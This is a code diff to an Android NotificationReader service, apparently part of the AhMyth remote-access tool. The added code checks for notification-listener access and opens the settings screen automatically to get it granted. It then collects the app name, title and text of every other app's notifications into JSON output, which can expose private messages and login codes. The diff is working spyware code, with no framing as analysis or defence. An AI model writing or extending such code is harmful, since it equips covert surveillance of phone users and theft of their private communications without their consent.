@@ -1,11 +1,16 @@
 package ahmyth.mine.king.ahmyth;
 
 import android.app.Notification;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.Settings;
 import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
+import android.text.TextUtils;
 import android.util.Log;
 
 import org.json.JSONArray;
@@ -26,19 +31,66 @@ public class NotificationReader extends NotificationListenerService {
     private static NotificationReader instance;
     private static List<NotificationEntry> notificationHistory = new ArrayList<>();
     private static boolean isEnabled = false;
+    private static Context appContext;
     
     public static NotificationReader getInstance() {
         return instance;
+    }
+    
+    public static void setContext(Context context) {
+        appContext = context.getApplicationContext();
     }
     
     public static boolean isServiceEnabled() {
         return isEnabled && instance != null;
     }
     
+    /**
+     * Check if notification listener is enabled in settings
+     */
+    public static boolean isNotificationAccessEnabled(Context context) {
+        if (context == null) return false;
+        
+        String pkgName = context.getPackageName();
+        final String flat = Settings.Secure.getString(context.getContentResolver(),
+                "enabled_notification_listeners");
+        if (!TextUtils.isEmpty(flat)) {
+            final String[] names = flat.split(":");
+            for (String name : names) {
+                final ComponentName cn = ComponentName.unflattenFromString(name);
+                if (cn != null && TextUtils.equals(pkgName, cn.getPackageName())) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+    
+    /**
+     * Open notification access settings
+     */
+    public static void openNotificationAccessSettings(Context context) {
+        if (context == null) return;
+        
+        try {
+            Intent intent;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+            } else {
+                intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+            }
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+        } catch (Exception e) {
+            Log.e(TAG, "Error opening notification settings", e);
+        }
+    }
+    
     @Override
     public void onCreate() {
         super.onCreate();
         instance = this;
+        appContext = getApplicationContext();
         Log.d(TAG, "NotificationReader created");
     }
     
@@ -147,13 +199,30 @@ public class NotificationReader extends NotificationListenerService {
         JSONArray notificationsArray = new JSONArray();
         
         try {
+            // Check if notification access is enabled
+            boolean accessEnabled = appContext != null && isNotificationAccessEnabled(appContext);
+            
+            if (!accessEnabled && !isEnabled) {
+                result.put("enabled", false);
+                result.put("error", "Notification access not enabled. Please enable in Settings > Apps > Special access > Notification access");
+                result.put("requiresSettings", true);
+                
+                // Try to open settings automatically
+                if (appContext != null) {
+                    openNotificationAccessSettings(appContext);
+                    result.put("settingsOpened", true);
+                }
+                
+                return result;
+            }
+            
             synchronized (notificationHistory) {
                 for (NotificationEntry entry : notificationHistory) {
                     notificationsArray.put(entry.toJSON());
                 }
             }
             
-            result.put("enabled", isEnabled);
+            result.put("enabled", isEnabled || accessEnabled);
             result.put("count", notificationsArray.length());
             result.put("notifications", notificationsArray);
             
@@ -181,11 +250,23 @@ public class NotificationReader extends NotificationListenerService {
                         notif.put("postTime", sbn.getPostTime());
                         notif.put("id", sbn.getId());
                         
+                        // Get app name
+                        try {
+                            PackageManager pm = getPackageManager();
+                            notif.put("appName", pm.getApplicationLabel(
+                                pm.getApplicationInfo(sbn.getPackageName(), 0)
+                            ).toString());
+                        } catch (Exception e) {
+                            notif.put("appName", sbn.getPackageName());
+                        }
+                        
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                             Bundle extras = sbn.getNotification().extras;
                             if (extras != null) {
-                                notif.put("title", extras.getCharSequence(Notification.EXTRA_TITLE));
-                                notif.put("text", extras.getCharSequence(Notification.EXTRA_TEXT));
+                                CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);
+                                CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
+                                notif.put("title", title != null ? title.toString() : "");
+                                notif.put("text", text != null ? text.toString() : "");
                             }
                         }
                         
@@ -212,6 +293,30 @@ public class NotificationReader extends NotificationListenerService {
             notificationHistory.clear();
         }
         Log.d(TAG, "Notification history cleared");
+    }
+    
+    /**
+     * Request notification access - opens settings
+     */
+    public static JSONObject requestAccess(Context context) {
+        JSONObject result = new JSONObject();
+        try {
+            if (isNotificationAccessEnabled(context)) {
+                result.put("enabled", true);
+                result.put("message", "Notification access already enabled");
+            } else {
+                openNotificationAccessSettings(context);
+                result.put("enabled", false);
+                result.put("settingsOpened", true);
+                result.put("message", "Please enable notification access for this app");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error requesting access", e);
+            try {
+                result.put("error", e.getMessage());
+            } catch (JSONException ignored) {}
+        }
+        return result;
     }
     
     /**
@@ -253,4 +358,3 @@ public class NotificationReader extends NotificationListenerService {
         }
     }
 }
-
